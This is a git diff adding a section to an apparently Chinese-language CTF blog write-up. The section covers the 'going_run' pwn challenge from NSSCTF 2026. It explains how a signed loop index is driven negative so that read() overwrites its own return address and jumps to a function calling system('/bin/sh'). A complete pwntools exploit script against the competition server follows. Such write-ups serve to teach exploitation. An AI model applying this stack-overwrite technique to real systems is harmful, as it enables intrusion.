@@ -226,3 +226,175 @@ io.interactive()
 ```
 
 ![图5](D:\my-blog\static\images\NSSCTF-2026秋季赛\图5.png)
+
+## going_run
+
+| 保护 | 状态 |
+| --- | --- |
+| PIE | 关闭（固定基址 0x400000） |
+| NX | 开启 |
+| Canary | 关闭 |
+| RELRO | Partial |
+| CET 标记 | 有（IBT/SHSTK 属性），远程未实际启用 shadow stack，否则改返回地址会直接崩 |
+
+`gitf()` 已经现成地调用了 `system("/bin/sh")`：
+
+```asm
+40121d <gitf>:
+    lea rdi, "我会说你好"
+    call puts
+    lea rdi, "/bin/sh"
+    call system
+    ret
+```
+
+所以目标很明确：劫持控制流到 `0x40121d`
+
+`main` 的关键循环：
+
+```c
+int i = 0;                         // rbp-4
+for (int j = 0; j <= 32; j++) {    // rbp-8
+    read(0, buf + i, 8);           // buf = rbp-0x20
+    i++;
+    if (i > 40) {                  
+        printf("你没有跑过我");
+        exit(0);
+    }
+}
+```
+
+栈布局：
+
+```c
+rbp-0x28  read() 的返回地址（call 时压入）
+rbp-0x20  buf[0]        <- 写入起点
+...
+rbp-0x08  j  = buf+24
+rbp-0x04  i  = buf+28
+rbp+0x00  saved rbp     = buf+32
+rbp+0x08  main 返回地址  = buf+40
+```
+
+有三个坑：
+
+坑 1：i、j 在缓冲区里
+
+`j` 和 `i` 分别是 `buf+24`、`buf+28`。第 17 次 read 开始写 `j`，第 21 次开始写 `i`。如果不管它们，循环会提前结束，或者下一次 read 的落点直接跑飞。
+
+坑 2：每次只前进 1 字节，但写 8 字节
+
+第 `t` 次 read 写 `buf+t .. buf+t+7`，相邻两次重叠 7 字节。最终：
+
+```c
+buf[k] = 第 k 次 read 的第 0 个字节   (k < 21 时成立)
+```
+
+所以不能把 `p64(addr)` 整体放在第 0 块里——后面 7 次 read 会把 `buf[1..7]` 覆盖掉。必须让第 `k` 块的第 0 字节等于地址的第 `k` 字节。
+
+坑 3：直接覆盖 main 返回值会被 exit(0) 截胡
+直接覆盖 main 的返回地址（buf+40）行不通：
+当 i=40 时 read 确实会写到 rbp+8 的返回地址，但 read 返回后执行i++ 变成 41，立刻进入 if (i > 40) -> exit(0)。被覆盖的 main 返回地址永远没有机会被 ret 使用，如下：
+
+```c
+add DWORD PTR [rbp-4], 1    ; i = 41
+cmp DWORD PTR [rbp-4], 0x28
+jle ...
+call printf
+call exit                   ; 直接退出
+```
+
+`main` 的返回地址根本没机会被 `ret` 用到。因此**不能走常规 ret2win 覆盖 main 返回地址**。
+
+利用思路：让 read 改写自己的返回地址
+
+`i` 是 signed int，`jle` 是有符号比较，**负数可以通过 `i > 40` 的检查**
+
+把 `i` 改成 `-9`，read 结束后 `i++` 变成 `-8`。下一次 read 的目标：
+
+```c
+buf + (-8) = rbp-0x28
+```
+
+而 `main` 的 `rsp = rbp-0x20`，`call read` 刚好把返回地址压到 `rbp-0x28`。于是 read 把 8 字节写进**自己本次调用的返回地址槽**；read 一返回，就直接跳到我们写入的地址。
+
+最终控制流：
+
+```c
+read 返回
+  -> 0x40101a (ret gadget)      ; 只做栈对齐
+  -> 0x40121d (gitf)
+  -> puts("我会说你好"); system("/bin/sh")
+```
+
+> rsp = rbp-0x20 -> ret 弹出 buf[0..7] -> rsp = rbp-0x18
+
+此时 `rsp % 16 == 8`，再进 `gitf` 正好符合 SysV ABI 的函数入口对齐要求。
+
+Payload 布局
+
+共 26 个 8 字节块：
+
+| t | 写入位置（相对 buf） | 发送内容 | 目的 / 踩坑 |
+| --- | --- | --- | --- |
+| 0~7 | 0~7 | 每块首字节 = `0x40121d` 对应字节 | 拼出 `buf[0..7]=0x40121d`，作为 ret 的第二跳 |
+| 8~16 | 8~16 | 0 | 填充 |
+| 17~20 | 17~20 | 0 | 写入开始碰到 `j`（buf+24），必须清零，否则 j>32 提前退出 |
+| 21 | 21 | `00*7 15` | j=0；i 最低字节写成 21，自增后仍为 22 |
+| 22 | 22 | `00*6 16 00` | j=0；i 低 2 字节写成 22 |
+| 23 | 23 | `00*5 17 00 00` | j=0；i 低 3 字节写成 23 |
+| 24 | 24 | `00000000 f7ffffff` | j=0；i=-9，自增后 -8，通过有符号检查 |
+| 25 | **-8 (rbp-0x28)** | `1a10400000000000` | 覆盖 read 自己的返回地址，跳到 ret gadget |
+
+之后：
+
+> read -> ret(0x40101a) -> 弹出 buf[0..7]=0x40121d -> gitf -> /bin/sh
+
+```python
+from pwn import *
+io = remote('node4.anna.nssnode.cn',23950)
+
+gitf = 0x40121d
+ret = 0x40101a
+
+io.recvuntil('你跑不过我，你信不信'.encode())
+
+addr = p64(gitf)
+
+# 1) 前 8 块：拼出 buf[0:8] = GITF。
+#    每次 read 只有第 0 个字节不会被下一次覆盖，
+#    所以第 k 块的第 0 字节 = 地址的第 k 字节。
+chunks = []
+for k in range(8):
+    chunks.append(bytes([addr[k]]) + b'\x00' * 7)
+# 2) 第 8~16 块：填充，没有特殊作用
+for _ in range(9):
+    chunks.append(b'\x00' * 8)
+# 3) 第 17~20 块：写入开始碰到 j（buf+24），清 0，
+#    否则 j 变大后循环会提前结束
+for _ in range(4):
+    chunks.append(b'\x00' * 8)
+# 4) 第 21~23 块：写入开始碰到 i（buf+28）。
+#    这里保持 i 等于当前轮数；i 的最高字节要等第 24 块才能写，
+#    所以现在还不能写负数。
+chunks.append(b'\x00' * 7 + p8(21))
+chunks.append(b'\x00' * 6 + p8(22) + b'\x00')
+chunks.append(b'\x00' * 5 + p8(23) + b'\x00' * 2)
+# 5) 第 24 块：完整覆盖 j 和 i，把 i 设为 -9。
+#    read 后还有 i++，所以会变成 -8，能通过 if (i > 40)
+chunks.append(p32(0) + p32(0xfffffff7))
+# 6) 第 25 块：i=-8，这次 read 写到 rbp-0x28，
+#    正好是 read 自己的返回地址。先跳到 ret 对齐栈。
+chunks.append(p64(ret))
+
+for chunk in chunks:
+    io.send(chunk)
+
+
+io. interactive()
+
+```
+
+![图6](D:\my-blog\static\images\NSSCTF-2026秋季赛\图6.png)
+
+> 啊~格调！太有格调了！（bushi）
